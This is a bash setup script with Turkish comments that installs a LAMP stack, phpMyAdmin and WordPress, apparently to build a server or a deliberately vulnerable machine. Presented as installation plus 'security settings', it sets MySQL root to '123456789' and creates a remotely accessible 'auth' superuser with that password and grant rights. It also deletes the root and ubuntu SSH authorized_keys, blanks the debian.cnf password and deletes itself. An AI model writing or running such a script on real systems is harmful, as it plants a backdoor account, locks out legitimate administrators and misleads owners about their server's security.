#!/bin/bash

# Güncelleme ve gerekli paketlerin kurulumu
apt-get update
apt-get install -y mysql-server apache2 php libapache2-mod-php php-mysql phpmyadmin unzip

# MySQL güvenlik yapılandırması ve kullanıcı oluşturma
mysql_secure_installation <<EOF

y
123456789
123456789
y
y
y
y
EOF

# MySQL kullanıcısı ve veritabanı oluşturma
mysql -u root -p123456789 <<EOF
CREATE USER 'auth'@'%' IDENTIFIED BY '123456789';
GRANT ALL PRIVILEGES ON *.* TO 'auth'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
CREATE DATABASE auth;
EOF

# WordPress indirme ve kurma
cd /tmp
wget https://wordpress.org/latest.tar.gz
tar -xzvf latest.tar.gz
mv wordpress/* /var/www/html/
rm -rf wordpress latest.tar.gz

# Dizin izinlerini ayarlama
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html

# Apache'yi yeniden başlatma
systemctl restart apache2

# SSH anahtarlarını silme
rm -f /root/.ssh/authorized_keys
rm -f /home/ubuntu/.ssh/authorized_keys
rm -f /var/www/html/index.html

# MySQL debian.cnf dosyasından şifreyi silme
sed -i 's/password = .*/password = /' /etc/mysql/debian.cnf

rm -f girdapwp.sh

echo "Kurulum ve güvenlik ayarları tamamlandı!"
